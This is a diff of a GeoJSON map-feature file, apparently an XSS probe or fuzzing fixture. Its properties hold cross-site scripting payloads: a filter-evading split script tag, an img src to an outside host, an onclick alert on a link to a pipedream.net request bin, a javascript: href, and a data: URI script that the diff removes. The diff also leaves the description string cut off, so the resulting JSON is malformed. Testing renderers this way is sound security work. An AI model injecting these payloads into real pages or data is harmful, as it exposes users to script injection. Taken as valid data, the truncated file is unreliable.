@@ -25,19 +25,11 @@
         },
         {
         "type": "Feature",
-        "geometry": {
-            "type": "LineString",
-            "coordinates": [[0, 0], [10, 10]]
-        },
         "properties": {
         "id": "ci25nrt5f2e94bfrw2sclq6dp <<scr<sc<script>img src=\"https://azer.az\"><scr<object>ipt>alert(1)</script>",
         "id-class": "azer",
         "title": "Paris - CloudFlare<a href=\"https://enmkbtx1as6g9.x.pipedream.net/\", onclick=”alert(10);“>azer</a>",
-        "description": "Edge Location<a href=\"javascript:alert(11);\">Back</a>",
-        "marker-size": "medium",
-        "marker-color": "#FFE900",
-        "class": "<a href=data:text/html,%3Cscript%3Ealert%28666%29%3C/script%3E>xss</a>",
-        "marker-symbol": "circle"
-      },
+        "description": "Edge Location<a href="
+      }
     }]
 }
